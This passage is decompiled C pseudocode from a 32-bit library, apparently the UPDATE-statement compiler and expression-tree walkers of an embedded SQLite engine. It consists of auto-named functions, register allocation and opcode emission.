      sub_1007105D((int *)v148);
      *(_DWORD *)(v148 + 512) = 0;
      *(_DWORD *)(v111 + 516) = 0;
      goto LABEL_57;
    case 324:
    case 325:
    case 326:
      v112 = v148;
      v113 = *(_DWORD *)(v148 + 512);
      if ( v113 )
      {
        *(_DWORD *)(v148 + 516) = v4[1] + v4[2] - v113;
      }
      else
      {
        *(_DWORD *)(v148 + 512) = v4[1];
        *(_DWORD *)(v112 + 516) = v4[2];
      }
      goto LABEL_57;
    default:
      goto LABEL_57;
  }
}
// 100828DD: variable 'v130' is possibly undefined
// 100828EF: variable 'v18' is possibly undefined
// 10082926: variable 'v22' is possibly undefined
// 1008292B: variable 'v23' is possibly undefined
// 10082A10: variable 'v33' is possibly undefined
// 100FC608: using guessed type __int16 word_100FC608[1544];
// 100FDB68: using guessed type __int16 word_100FDB68[316];

//----- (100840E0) --------------------------------------------------------
void __usercall sub_100840E0(int a1@<ebx>, int a2, int a3, unsigned int a4, int a5)
{
  int v5; // eax
  int v6; // edi
  _DWORD v7[3]; // [esp+8h] [ebp-18h] BYREF
  unsigned int v8; // [esp+14h] [ebp-Ch] BYREF
  int v9; // [esp+18h] [ebp-8h]
  int v10; // [esp+1Ch] [ebp-4h]

  if ( *(int *)a1 < 0 )
  {
    *(_DWORD *)(a1 + 4) = -1;
    *(_DWORD *)a1 = 0;
    *(_WORD *)(a1 + 12) = 0;
    *(_BYTE *)(a1 + 14) = 0;
  }
  v8 = a4;
  v9 = a5;
  *(_DWORD *)(a1 + 8) = a3;
  while ( 1 )
  {
    v5 = sub_10082536((_DWORD *)a1, a2);
    if ( v5 < 631 )
      break;
    if ( v5 >= 961 )
    {
      v7[0] = v8;
      v7[1] = v9;
      v7[2] = v10;
      v6 = *(_DWORD *)(a1 + 8);
      sub_10059320((int *)v6, aNearTSyntaxErr_0, v7);
      *(_BYTE *)(v6 + 20) = 1;
      *(_DWORD *)(a1 + 8) = v6;
      sub_10082428(a1, a2, &v8);
      a2 = 254;
    }
    else
    {
      sub_10082606((int *)a1, v5 - 631);
    }
    if ( a2 == 254 || *(int *)a1 < 0 )
      return;
  }
  sub_100825AD((int *)a1, v5, a2, &v8);
  --*(_DWORD *)(a1 + 4);
}
// 100840E0: using guessed type _DWORD var_18[3];

//----- (10084195) --------------------------------------------------------
void __usercall sub_10084195(int a1@<eax>, int *a2@<ebx>, int a3@<edi>, int a4)
{
  int v4; // esi
  void *Src; // [esp+8h] [ebp-4h] BYREF

  if ( !*(_DWORD *)(a3 + 28) )
  {
    v4 = 24 * a1;
    sub_1005A876(
      *a2,
      *(unsigned __int8 **)(v4 + *(_DWORD *)(a3 + 16) + 4),
      *(unsigned __int8 *)(*(_DWORD *)(*(_DWORD *)(*a2 + 8) + 12) + 73),
      *(unsigned __int8 *)(v4 + *(_DWORD *)(a3 + 16) + 22),
      &Src);
    if ( Src )
      sub_1005AFA8(-1, a2, (unsigned __int16 *)Src, (_BYTE *)0xFFFFFFF8);
    if ( a4 >= 0 && *(_BYTE *)(v4 + *(_DWORD *)(a3 + 16) + 22) == 101 )
      sub_1005ABD1((int)a2, 22, a4);
  }
}

//----- (10084205) --------------------------------------------------------
void __cdecl sub_10084205(int *a1, int a2, int *a3, void **Src, int a5)
{
  int *v5; // ebx
  int *v6; // eax
  int *v7; // edi
  int v8; // eax
  int *i; // esi
  int v10; // eax
  int v11; // ecx
  int j; // eax
  bool v13; // cc
  int v14; // esi
  int v15; // esi
  int v16; // eax
  int v17; // ecx
  int *v18; // eax
  int v19; // ecx
  _DWORD *v20; // edx
  int *v21; // edx
  int *v22; // eax
  int v23; // ecx
  bool v24; // zf
  int v25; // ecx
  _DWORD *v26; // esi
  _DWORD *v27; // eax
  unsigned int v28; // edi
  _DWORD *v29; // edi
  int v30; // eax
  unsigned __int16 *v31; // eax
  int v32; // ecx
  int v33; // esi
  int v34; // eax
  int v35; // edi
  int v36; // esi
  int v37; // eax
  int n; // esi
  int v39; // esi
  int v40; // ecx
  int ii; // eax
  int v42; // edi
  int v43; // [esp-14h] [ebp-A4h]
  int v44; // [esp-4h] [ebp-94h]
  int *v45; // [esp+Ch] [ebp-84h]
  int v46; // [esp+10h] [ebp-80h]
  int v47; // [esp+14h] [ebp-7Ch]
  int v48; // [esp+14h] [ebp-7Ch]
  int v49; // [esp+14h] [ebp-7Ch]
  int m; // [esp+14h] [ebp-7Ch]
  int v51; // [esp+14h] [ebp-7Ch]
  unsigned __int8 **v52; // [esp+18h] [ebp-78h]
  int *v53; // [esp+18h] [ebp-78h]
  int v54; // [esp+18h] [ebp-78h]
  int v55; // [esp+18h] [ebp-78h]
  int v56; // [esp+1Ch] [ebp-74h]
  _DWORD *v57; // [esp+1Ch] [ebp-74h]
  int v58; // [esp+1Ch] [ebp-74h]
  int v59; // [esp+20h] [ebp-70h]
  int v60; // [esp+24h] [ebp-6Ch]
  int v61; // [esp+28h] [ebp-68h]
  int v62; // [esp+28h] [ebp-68h]
  void **v63; // [esp+2Ch] [ebp-64h]
  unsigned __int8 **v64; // [esp+2Ch] [ebp-64h]
  int v65; // [esp+2Ch] [ebp-64h]
  int k; // [esp+2Ch] [ebp-64h]
  _DWORD *v67; // [esp+30h] [ebp-60h]
  int v68; // [esp+34h] [ebp-5Ch]
  int *v69; // [esp+38h] [ebp-58h]
  int v70; // [esp+3Ch] [ebp-54h]
  int v71; // [esp+40h] [ebp-50h]
  int v72; // [esp+44h] [ebp-4Ch]
  int v73; // [esp+48h] [ebp-48h]
  int v74; // [esp+48h] [ebp-48h]
  int v75; // [esp+48h] [ebp-48h]
  int v76; // [esp+4Ch] [ebp-44h]
  int v77; // [esp+50h] [ebp-40h] BYREF
  int v78; // [esp+54h] [ebp-3Ch]
  int v79; // [esp+58h] [ebp-38h]
  BOOL v80; // [esp+5Ch] [ebp-34h]
  int v81; // [esp+60h] [ebp-30h]
  int v82[11]; // [esp+64h] [ebp-2Ch] BYREF

  v69 = 0;
  v67 = 0;
  v63 = 0;
  v76 = 0;
  v78 = 0;
  v79 = 0;
  v73 = 0;
  memset(&v82[9], 0, 8u);
  v5 = a1;
  v72 = *a1;
  if ( a1[16] )
    goto LABEL_161;
  if ( *(_BYTE *)(*a1 + 30) )
    goto LABEL_161;
  v6 = sub_1008010E(a2, a1);
  v7 = v6;
  v46 = (int)v6;
  if ( !v6 )
    goto LABEL_161;
  v81 = sub_1005855F(*a1, v6[17]);
  v71 = sub_100730F2(a1, (int)v7, 107, a3, &v77);
  v80 = v7[7] != 0;
  if ( sub_1006B423(a1, (int)v7) )
    goto LABEL_161;
  if ( sub_10080158((int)a1, (int)v7, v77) )
    goto LABEL_161;
  v67 = sub_10059073(v72, 4 * v7[3]);
  if ( !v67 )
    goto LABEL_161;
  v8 = 0;
  for ( i = v7; v8 < v7[3]; ++v8 )
    v67[v8] = -1;
  v10 = a1[17];
  *(_DWORD *)(a2 + 32) = v10;
  v11 = ++a1[17];
  v59 = v10;
  for ( j = v7[5]; j; j = *(_DWORD *)(j + 32) )
    a1[17] = ++v11;
  memset(v82, 0, 0x24u);
  v13 = *a3 <= 0;
  v82[0] = (int)a1;
  v82[1] = a2;
  v68 = 0;
  v47 = 0;
  if ( !v13 )
  {
    v56 = 0;
    while ( 1 )
    {
      if ( sub_1008003C(*(_DWORD *)(v56 + a3[3]), (int)v82) )
        goto LABEL_161;
      v61 = 0;
      if ( *(int *)(v46 + 12) <= 0 )
      {
LABEL_19:
        v15 = v47;
      }
      else
      {
        v14 = v56 + a3[3];
        v52 = *(unsigned __int8 ***)(v46 + 16);
        while ( sub_100593BE(*v52, *(unsigned __int8 **)(v14 + 4)) )
        {
          ++v61;
          v52 += 6;
          if ( v61 >= *(_DWORD *)(v46 + 12) )
            goto LABEL_19;
        }
        if ( v61 == *(_DWORD *)(v46 + 8) )
        {
          v68 = 1;
          v63 = *(void ***)v14;
        }
        v15 = v47;
        v67[v61] = v47;
      }
      if ( v61 >= *(_DWORD *)(v46 + 12) )
      {
        v64 = (unsigned __int8 **)(v56 + a3[3]);
        if ( !sub_10076961(v64[1]) )
        {
          sub_10059320(a1, "no such column: %s", *(const char **)(20 * v15 + a3[3] + 4));
          goto LABEL_161;
        }
        v68 = 1;
        v63 = (void **)*v64;
      }
      v56 += 20;
      v47 = v15 + 1;
      if ( v15 + 1 >= *a3 )
      {
        i = (int *)v46;
        break;
      }
    }
  }
  if ( (*(_DWORD *)(*a1 + 12) & 0x4000000) != 0 )
    v70 = sub_1008146C(i, (int)v67, v68);
  else
    v70 = 0;
  v16 = i[5];
  v17 = 0;
  if ( v16 )
  {
    do
    {
      v16 = *(_DWORD *)(v16 + 32);
      ++v17;
    }
    while ( v16 );
    if ( v17 > 0 )
    {
      v69 = sub_10059073(v72, 4 * v17);
      if ( !v69 )
        goto LABEL_161;
      i = (int *)v46;
    }
  }
  v18 = (int *)i[5];
  v19 = 0;
  if ( v18 )
  {
    v53 = v69;
    while ( 1 )
    {
      if ( v68 )
        goto LABEL_45;
      v48 = 0;
      if ( v18[1] > 0 )
        break;
LABEL_46:
      v21 = v53++;
      *v21 = v19;
      v18 = (int *)v18[8];
      v19 = 0;
      if ( !v18 )
        goto LABEL_47;
    }
    v20 = (_DWORD *)v18[2];
    while ( (int)v67[*v20] < 0 )
    {
      ++v48;
      ++v20;
      if ( v48 >= v18[1] )
        goto LABEL_46;
    }
LABEL_45:
    v19 = ++a1[18];
    goto LABEL_46;
  }
LABEL_47:
  v22 = sub_1007C271(a1);
  v45 = v22;
  if ( !v22 )
    goto LABEL_161;
  if ( !*((_BYTE *)a1 + 19) )
    *((_BYTE *)v22 + 97) = 1;
  sub_1006CB39(a1, v81, 1);
  if ( (*(_BYTE *)(v46 + 34) & 0x10) != 0 )
  {
    sub_10084CDF(v46, a1, a2, (int)a3, v63, (int)v67, (int)Src);
    Src = 0;
    a2 = 0;
    goto LABEL_161;
  }
  v23 = ++a1[18];
  v62 = v23;
  v60 = v23;
  if ( v71 || v70 )
  {
    v79 = v23 + 1;
    a1[18] = v23 + *(_DWORD *)(v46 + 12);
  }
  if ( v68 || v71 || v70 )
    v62 = ++a1[18];
  v24 = !v80;
  v25 = a1[18];
  v54 = v25 + 1;
  a1[18] = v25 + *(_DWORD *)(v46 + 12) + 1;
  if ( !v24 )
    sub_100801C4(a1, v46, Src, v59);
  if ( sub_1008003C((int)Src, (int)v82) )
    goto LABEL_161;
  v26 = 0;
  sub_1005ABE8((int)v45, 10, 0, v60);
  v27 = sub_10087D63(a1, (__int16 *)a2, (unsigned __int8 *)Src, 0, 4);
  v28 = (unsigned int)v27;
  if ( !v27 )
    goto LABEL_161;
  v57 = (_DWORD *)*((unsigned __int8 *)v27 + 6);
  sub_1005ABE8((int)v45, 60, v59, v60);
  if ( !v57 )
  {
    v73 = ++a1[18];
    sub_1005ABE8((int)v45, 104, v73, v60);
  }
  sub_100883D6(v28);
  if ( (*(_WORD *)(v72 + 12) & 0x1000) != 0 && !a1[107] )
  {
    v78 = ++a1[18];
    sub_1005ABE8((int)v45, 7, 0, v78);
  }
  v29 = (_DWORD *)v46;
  if ( !v80 )
  {
    if ( !v57 )
      sub_100791F0(v46, a1, v59, v81, 39);
    if ( a5 == 5 )
    {
LABEL_77:
      v76 = 1;
    }
    else
    {
      v30 = *(_DWORD *)(v46 + 20);
      v76 = 0;
      while ( v30 )
      {
        if ( *(_BYTE *)(v30 + 24) == 5 )
          goto LABEL_77;
        v30 = *(_DWORD *)(v30 + 32);
      }
    }
    v49 = 0;
    v26 = *(_DWORD **)(v46 + 20);
    while ( v26 )
    {
      if ( v76 || v69[v49] > 0 )
      {
        v31 = (unsigned __int16 *)sub_1006CBB6(a1, v26);
        sub_1005AC02(v45, 39, v59 + v49 + 1, v26[5], v81, v31, (_BYTE *)0xFFFFFFF0);
      }
      v26 = (_DWORD *)v26[8];
      ++v49;
    }
  }
  if ( v57 == v26 )
  {
    v58 = sub_1005AB66((int)v45, 105, v73, (int)v26, v60);
  }
  else
  {
    v74 = sub_1005ABD1((int)v45, 74, v60);
    v58 = sub_1005ABB9((int)v45, 1);
    sub_1005AE20(v74, (int)v45);
  }
  sub_1005AB66((int)v45, 51, v59, v58, v60);
  if ( (_DWORD *)v68 != v26 )
  {
    sub_10077F49(a1, v62, (unsigned __int8 *)v63);
    sub_1005ABD1((int)v45, 21, v62);
    v29 = (_DWORD *)v46;
    v32 = v44;
    v26 = 0;
  }
  if ( (_DWORD *)v70 != v26 )
  {
    v34 = sub_100813BF(v32, v29, a1);
    v29 = (_DWORD *)v46;
    v5 = a1;
    v65 = v34;
    goto LABEL_92;
  }
  if ( (_DWORD *)v71 != v26 )
  {
    v65 = (int)v26;
LABEL_92:
    v33 = 0;
    for ( k = sub_10073612(v71, (int)v5, a3, 0, 3u, (int)v29, a5) | v65; v33 < v29[3]; ++v33 )
    {
      if ( (int)v67[v33] < 0 || k == -1 || ((1 << v33) & k) != 0 )
      {
        v35 = v33 + v79;
        sub_1005AB66((int)v45, 28, v59, v33, v33 + v79);
        v43 = v35;
        v29 = (_DWORD *)v46;
        sub_10084195(v33, v45, v46, v43);
        v5 = a1;
      }
      else
      {
        sub_1005ABE8((int)v45, 10, 0, v33 + v79);
      }
    }
    if ( !v68 )
      sub_1005ABE8((int)v45, 14, v60, v62);
  }
  v36 = 0;
  v75 = sub_10073612(v71, (int)v5, a3, 1, 1u, (int)v29, a5);
  for ( m = 0; v36 < v29[3]; m = ++v36 )
  {
    if ( v36 == v29[2] )
    {
      sub_1005ABE8((int)v45, 10, 0, v36 + v54);
    }
    else
    {
      v37 = v67[v36];
      if ( v37 < 0 )
      {
        if ( (v77 & 1) != 0 && v36 <= 31 && ((1 << v36) & v75) == 0 )
          continue;
        sub_1005AB66((int)v45, 28, v59, m, v54 + m);
        v29 = (_DWORD *)v46;
        sub_10084195(m, v45, v46, v54 + m);
        v5 = a1;
      }
      else
      {
        sub_10077F49(v5, v54 + m, *(unsigned __int8 **)(20 * v37 + a3[3]));
        v29 = (_DWORD *)v46;
      }
      v36 = m;
    }
  }
  if ( (v77 & 1) != 0 )
  {
    sub_1005ABE8((int)v45, 29, v54, v29[3]);
    sub_100792A9((int)v29, v45);
    for ( n = v71; n; n = *(_DWORD *)(n + 32) )
    {
      if ( *(_BYTE *)(n + 8) == 107 && *(_BYTE *)(n + 9) == 1 && sub_100730B2(a3, *(_DWORD *)(n + 16)) )
        sub_10073539(v5, n, v29, v60, a5, v58);
    }
    sub_1005AB66((int)v45, 51, v59, v58, v60);
    if ( (int)v29[3] > 0 )
    {
      do
      {
        if ( (int)v67[n] < 0 && n != v29[2] )
        {
          sub_1005AB66((int)v45, 28, v59, n, v54 + n);
          v29 = (_DWORD *)v46;
          sub_10084195(n, v45, v46, v54 + n);
          v5 = a1;
        }
        ++n;
      }
      while ( n < v29[3] );
    }
  }
  if ( !v80 )
  {
    sub_1007A25D(v5, (int)v29, v59, v62, (int)v69, v68 != 0 ? v60 : 0, 1, a5, v58, 0);
    if ( v70 )
      sub_10081142(v5, v29, v60, 0);
    v39 = sub_1005AB66((int)v45, 51, v59, 0, v60);
    sub_10080855((int)v29, v5, v59, v69);
    if ( v70 || v68 )
      sub_1005ABE8((int)v45, 56, v59, 0);
    sub_1005AE20(v39, (int)v45);
    if ( v70 )
      sub_10081142(a1, (_DWORD *)v46, 0, v62);
    sub_1007A82F(v46, (int)a1, v59, v62, (int)v69, 1, 0, 0);
    if ( v70 )
      sub_100819B5(v40, a1, (_DWORD *)v46, (int)a3, v60);
    v5 = a1;
    v29 = (_DWORD *)v46;
  }
  if ( (*(_WORD *)(v72 + 12) & 0x1000) != 0 && !v5[107] )
    sub_1005ABE8((int)v45, 20, v78, 1);
  for ( ii = v71; ; ii = *(_DWORD *)(ii + 32) )
  {
    v55 = ii;
    if ( !ii )
      break;
    if ( *(_BYTE *)(ii + 8) == 107 && *(_BYTE *)(ii + 9) == 2 )
    {
      if ( sub_100730B2(a3, *(_DWORD *)(ii + 16)) )
        sub_10073539(v5, v55, v29, v60, a5, v58);
      ii = v55;
    }
  }
  sub_1005ABE8((int)v45, 1, 0, v58);
  sub_1005AE20(v58, (int)v45);
  v42 = v29[5];
  v51 = 0;
  while ( v42 )
  {
    if ( v76 || v69[v51] > 0 )
      sub_1005ABE8((int)v45, 42, v59 + v51 + 1, 0);
    v42 = *(_DWORD *)(v42 + 32);
    ++v51;
  }
  sub_1005ABE8((int)v45, 42, v59, 0);
  if ( !*((_BYTE *)v5 + 19) && !v5[107] )
    sub_1007952A(v5);
  if ( (*(_WORD *)(v72 + 12) & 0x1000) != 0 && !v5[107] && !*((_BYTE *)v5 + 19) )
  {
    sub_1005ABE8((int)v45, 16, v78, 1);
    sub_1005B4BC(1, (int)v45);
    sub_1005B518((int)v45, 0, 0, aRowsUpdated, 0);
  }
LABEL_161:
  sub_10058EC7(v72, (unsigned int)v69);
  sub_10058EC7(v72, (unsigned int)v67);
  sub_1006C7F7((__int16 *)a2, v72);
  sub_100767B1(a3, v72);
  sub_10075FD8(v72, (unsigned int)Src);
}
// 100847D7: variable 'v44' is possibly undefined
// 1008484A: variable 'v32' is possibly undefined
// 10084B3E: variable 'v40' is possibly undefined
// 10073539: using guessed type _DWORD __cdecl sub_10073539(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (10084CDF) --------------------------------------------------------
void __usercall sub_10084CDF(int a1@<eax>, int *a2@<ecx>, int a3, int a4, void **Src, int a6, int a7)
{
  int v8; // edx
  int v10; // edx
  _DWORD *v11; // eax
  _DWORD *v12; // eax
  bool v13; // cc
  int v14; // ecx
  _DWORD *v15; // eax
  int *v16; // eax
  int v17; // ebx
  int v18; // ecx
  int v19; // eax
  int v20; // eax
  int *v21; // edi
  int v22; // esi
  char v23[4]; // [esp+Ch] [ebp-30h] BYREF
  int v24; // [esp+10h] [ebp-2Ch]
  int v25; // [esp+14h] [ebp-28h]
  int v26; // [esp+18h] [ebp-24h]
  int v27; // [esp+1Ch] [ebp-20h]
  unsigned __int16 *v28; // [esp+20h] [ebp-1Ch]
  int v29; // [esp+24h] [ebp-18h]
  int v30; // [esp+28h] [ebp-14h]
  int *v31; // [esp+2Ch] [ebp-10h]
  int *v32; // [esp+30h] [ebp-Ch]
  int v33; // [esp+34h] [ebp-8h]
  void *Srca; // [esp+4Ch] [ebp+10h]

  v8 = *a2;
  v32 = (int *)a2[3];
  v30 = v8;
  v28 = (unsigned __int16 *)sub_10070E9E(a1, v8);
  v11 = sub_10075D3B(v10, 26);
  v31 = sub_100766CA(a2, 0, (unsigned int)v11);
  if ( Src )
  {
    v12 = sub_1007631C(v30, Src, 0);
    v31 = sub_100766CA(a2, v31, (unsigned int)v12);
  }
  v13 = *(_DWORD *)(a1 + 12) <= 0;
  v33 = 0;
  if ( !v13 )
  {
    v29 = 0;
    do
    {
      v14 = *(_DWORD *)(a6 + 4 * v33);
      if ( v14 < 0 )
        v15 = sub_10075D3B(v30, 26);
      else
        v15 = sub_1007631C(v30, *(void ***)(20 * v14 + *(_DWORD *)(a4 + 12)), 0);
      ++v33;
      v29 += 24;
      v31 = sub_100766CA(a2, v31, (unsigned int)v15);
    }
    while ( v33 < *(_DWORD *)(a1 + 12) );
  }
  v16 = (int *)sub_1007AF57(v31, a2, a3, a7, 0, 0, 0, 0, 0, 0);
  v17 = a2[17];
  v31 = v16;
  a2[17] = v17 + 1;
  v18 = *(_DWORD *)(a1 + 12);
  v29 = Src != 0;
  sub_1005ABE8((int)v32, 40, v17, v18 + v29 + 1);
  v25 = 0;
  v26 = 0;
  strcpy(v23, "\b");
  v24 = v17;
  sub_1007E480((int)a2, (_DWORD **)v31, (unsigned __int8 *)v23);
  Srca = (void *)++a2[18];
  a2[18] = (int)Srca + *(_DWORD *)(a1 + 12) + 1;
  v27 = sub_1005ABE8((int)v32, 64, v17, 0);
  sub_1005AB66((int)v32, 28, v17, 0, (int)Srca);
  sub_1005AB66((int)v32, 28, v17, v29, (int)Srca + 1);
  v19 = 0;
  v13 = *(_DWORD *)(a1 + 12) <= 0;
  v33 = 0;
  if ( !v13 )
  {
    while ( 1 )
    {
      sub_1005AB66((int)v32, 28, v17, v29 + v19 + 1, (int)Srca + v19 + 2);
      if ( ++v33 >= *(_DWORD *)(a1 + 12) )
        break;
      v19 = v33;
    }
  }
  sub_10071860(a2, a1);
  v20 = *(_DWORD *)(a1 + 12);
  v21 = v32;
  sub_1005AC02(v32, 129, 0, v20 + 2, (int)Srca, v28, (_BYTE *)0xFFFFFFF6);
  sub_1006CB6D(a2);
  v22 = v27;
  sub_1005ABE8((int)v21, 66, v17, v27 + 1);
  sub_1005AE20(v22, (int)v21);
  sub_1005ABE8((int)v21, 42, v17, 0);
  sub_1007B016(v30, (unsigned int)v31);
}
// 10084D0B: variable 'v10' is possibly undefined

//----- (10084F0D) --------------------------------------------------------
int __cdecl sub_10084F0D(int (__cdecl **a1)(_DWORD, int), int a2)
{
  int v3; // eax
  char v4; // bl
  int v5; // eax

  if ( !a2 )
    return 0;
  v3 = (*a1)(a1, a2);
  v4 = v3;
  if ( !v3
    && (*(_WORD *)(a2 + 2) & 0x2000) == 0
    && (sub_10084F0D(a1, *(_DWORD *)(a2 + 8))
     || sub_10084F0D(a1, *(_DWORD *)(a2 + 12))
     || ((*(_WORD *)(a2 + 2) & 0x800) == 0
       ? (v5 = sub_10084F84(*(int **)(a2 + 16), (int)a1))
       : (v5 = sub_10085024((int)a1, *(_DWORD *)(a2 + 16))),
         v5)) )
  {
    return 2;
  }
  else
  {
    return v4 & 2;
  }
}

//----- (10084F84) --------------------------------------------------------
int __usercall sub_10084F84@<eax>(int *a1@<eax>, int a2)
{
  int v2; // edi
  _DWORD *v3; // esi

  if ( a1 )
  {
    v2 = *a1;
    v3 = (_DWORD *)a1[3];
    while ( v2 > 0 )
    {
      if ( sub_10084F0D(a2, *v3) )
        return 2;
      --v2;
      v3 += 5;
    }
  }
  return 0;
}
// 10084F0D: using guessed type _DWORD __cdecl sub_10084F0D(_DWORD, _DWORD);

//----- (10084FB7) --------------------------------------------------------
int __usercall sub_10084FB7@<eax>(int a1@<edi>, int a2@<esi>)
{
  int v3; // [esp+0h] [ebp-4h]

  if ( sub_10084F84(*(int **)a2, v3)
    || sub_10084F0D(a1, *(_DWORD *)(a2 + 12))
    || sub_10084F84(*(int **)(a2 + 16), a1)
    || sub_10084F0D(a1, *(_DWORD *)(a2 + 20))
    || sub_10084F84(*(int **)(a2 + 24), a1)
    || sub_10084F0D(a1, *(_DWORD *)(a2 + 40)) )
  {
    return 2;
  }
  else
  {
    return sub_10084F0D(a1, *(_DWORD *)(a2 + 44)) != 0 ? 2 : 0;
  }
}
// 10084FBA: variable 'v3' is possibly undefined
// 10084F0D: using guessed type _DWORD __cdecl sub_10084F0D(_DWORD, _DWORD);

//----- (10085024) --------------------------------------------------------
int __cdecl sub_10085024(int a1, int a2)
{
  int v2; // esi
  int v3; // edi
  int v4; // eax
  __int16 *v5; // eax
  int v6; // ebx
  _DWORD *v7; // edi
  char v9; // [esp+18h] [ebp+Ch]

  v2 = a2;
  if ( !a2 )
    return 0;
  v3 = a1;
  if ( !*(_DWORD *)(a1 + 4) )
    return 0;
  while ( 1 )
  {
    v4 = (*(int (__cdecl **)(int, int))(v3 + 4))(v3, v2);
    v9 = v4;
    if ( v4 )
      return v9 & 2;
    if ( sub_10084FB7(v3, v2) )
      return 2;
    v5 = *(__int16 **)(v2 + 8);
    if ( v5 )
      break;
LABEL_11:
    v2 = *(_DWORD *)(v2 + 28);
    if ( !v2 )
      return v9 & 2;
  }
  v6 = *v5;
  if ( v6 <= 0 )
  {
LABEL_10:
    v3 = a1;
    goto LABEL_11;
  }
  v7 = v5 + 12;
  while ( !sub_10085024(a1, *v7) )
  {
    --v6;
    v7 += 14;
    if ( v6 <= 0 )
      goto LABEL_10;
  }
  return 2;
}

//----- (10085098) --------------------------------------------------------
_DWORD *__usercall sub_10085098@<eax>(_DWORD *result@<eax>, int a2@<ecx>, int a3)
{
  *result = a2;
  result[1] = a3;
  result[5] = 0;
  result[6] = 8;
  result[7] = result + 8;
  result[2] = 0;
  result[3] = 0;
  return result;
}

//----- (100850BD) --------------------------------------------------------
void __cdecl sub_100850BD(int a1)
{
  int v2; // ebx
  int v3; // esi
  char v4; // al
  unsigned int v5; // eax
  unsigned int v6; // [esp+Ch] [ebp-4h]
  int i; // [esp+18h] [ebp+8h]

  v2 = *(_DWORD *)(a1 + 20) - 1;
  v3 = *(_DWORD *)(a1 + 28);
  for ( i = **(_DWORD **)a1; v2 >= 0; v3 += 40 )
  {
    if ( (*(_BYTE *)(v3 + 18) & 1) != 0 )
      sub_10075FD8(i, *(_DWORD *)v3);
    v4 = *(_BYTE *)(v3 + 18);
    if ( (v4 & 0x10) != 0 || (v4 & 0x20) != 0 )
    {
      v6 = *(_DWORD *)(v3 + 12);
      sub_100850BD(v6);
      sub_10058EC7(i, v6);
    }
    --v2;
  }
  v5 = *(_DWORD *)(a1 + 28);
  if ( v5 != a1 + 32 )
    sub_10058EC7(i, v5);
}

//----- (10085130) --------------------------------------------------------
int __usercall sub_10085130@<eax>(int a1@<edi>, unsigned int a2, char a3)
{
  int v3; // eax
  int v4; // esi
  const void *v5; // ebx
  _DWORD *v6; // eax
  int result; // eax
  int v8; // ecx

  v3 = *(_DWORD *)(a1 + 24);
  if ( *(_DWORD *)(a1 + 20) < v3 )
  {
LABEL_9:
    result = *(_DWORD *)(a1 + 20);
    v8 = *(_DWORD *)(a1 + 28) + 40 * result;
    *(_DWORD *)(a1 + 20) = result + 1;
    *(_DWORD *)(v8 + 4) = -1;
    *(_DWORD *)v8 = a2;
    *(_BYTE *)(v8 + 18) = a3;
    *(_DWORD *)(v8 + 20) = a1;
    return result;
  }
  v4 = **(_DWORD **)a1;
  v5 = *(const void **)(a1 + 28);
  v6 = sub_10059073(v4, 80 * v3);
  *(_DWORD *)(a1 + 28) = v6;
  if ( v6 )
  {
    memcpy(v6, v5, 40 * *(_DWORD *)(a1 + 20));
    if ( v5 != (const void *)(a1 + 32) )
      sub_10058EC7(v4, (unsigned int)v5);
    *(_DWORD *)(a1 + 24) = sub_10058E55(*(_DWORD *)(a1 + 28)) / 0x28u;
    goto LABEL_9;
  }
  if ( (a3 & 1) != 0 )
    sub_10075FD8(v4, a2);
  *(_DWORD *)(a1 + 28) = v5;
  return 0;
}

//----- (100851CA) --------------------------------------------------------
int __cdecl sub_100851CA(int a1, unsigned __int8 *a2, int a3)
{
  int result; // eax

  while ( 1 )
  {
    *(_BYTE *)(a1 + 16) = a3;
    if ( !a2 )
      break;
    if ( *a2 != a3 )
      return sub_10085130(a1, (unsigned int)a2, 0);
    result = sub_100851CA(a1, *((_DWORD *)a2 + 2), a3);
    a2 = (unsigned __int8 *)*((_DWORD *)a2 + 3);
  }
  return result;
}

//----- (1008520A) --------------------------------------------------------
__int64 __usercall sub_1008520A@<edx:eax>(int *a1@<eax>, int a2)
{
  int v2; // edx
  int v3; // ecx
  _DWORD *i; // eax

  v2 = *a1;
  v3 = 0;
  if ( *a1 <= 0 )
    return 0i64;
  for ( i = a1 + 1; *i != a2; ++i )
  {
    if ( ++v3 >= v2 )
      return 0i64;
  }
  return 1i64 << v3;
}

//----- (1008523B) --------------------------------------------------------
int __cdecl sub_1008523B(int *a1, int a2)
{
  int v3; // edi
  int v4; // edi
  int v5; // eax

  if ( !a2 )
    return 0;
  if ( *(_BYTE *)a2 == 0x98 )
    return sub_1008520A(a1, *(_DWORD *)(a2 + 24));
  v3 = sub_1008523B(a1, *(_DWORD *)(a2 + 12));
  v4 = sub_1008523B(a1, *(_DWORD *)(a2 + 8)) | v3;
  if ( (*(_WORD *)(a2 + 2) & 0x800) != 0 )
    v5 = sub_10085308(*(_DWORD *)(a2 + 16), (int)a1);
  else
    v5 = sub_100852B6((int)a1, (int *)*(_DWORD *)(a2 + 16));
  return v5 | v4;
}

//----- (100852B6) --------------------------------------------------------
__int64 __cdecl sub_100852B6(int a1, int *a2)
{
  int v2; // ebx
  int v3; // edi
  __int64 v5; // [esp+10h] [ebp-8h]

  v2 = 0;
  v5 = 0i64;
  if ( a2 && *a2 > 0 )
  {
    v3 = 0;
    do
    {
      v5 |= sub_1008523B(a1, *(_DWORD *)(a2[3] + v3));
      ++v2;
      v3 += 20;
    }
    while ( v2 < *a2 );
  }
  return v5;
}
// 1008523B: using guessed type __int64 __cdecl sub_1008523B(_DWORD, _DWORD);

//----- (10085308) --------------------------------------------------------
int __usercall sub_10085308@<eax>(int a1@<eax>, int a2)
{
  int v2; // edi
  int v4; // ebx
  __int64 v5; // rax
  int v6; // edi
  int v7; // ebx
  __int64 v8; // rax
  int v9; // edi
  int v10; // ebx
  __int64 v11; // rax
  int v12; // edi
  int v13; // ebx
  __int64 v14; // rax
  int v15; // edi
  int v16; // ebx
  __int64 v17; // rax

  v2 = 0;
  v4 = 0;
  while ( a1 )
  {
    v5 = sub_100852B6(a2, (int *)*(_DWORD *)a1);
    v6 = v5 | v2;
    v7 = HIDWORD(v5) | v4;
    v8 = sub_100852B6(a2, (int *)*(_DWORD *)(a1 + 16));
    v9 = v8 | v6;
    v10 = HIDWORD(v8) | v7;
    v11 = sub_100852B6(a2, (int *)*(_DWORD *)(a1 + 24));
    v12 = v11 | v9;
    v13 = HIDWORD(v11) | v10;
    v14 = sub_1008523B(a2, *(_DWORD *)(a1 + 12));
    v15 = v14 | v12;
    v16 = HIDWORD(v14) | v13;
    v17 = sub_1008523B(a2, *(_DWORD *)(a1 + 20));
    a1 = *(_DWORD *)(a1 + 28);
    v2 = v17 | v15;
    v4 = HIDWORD(v17) | v16;
  }
  return v2;
}
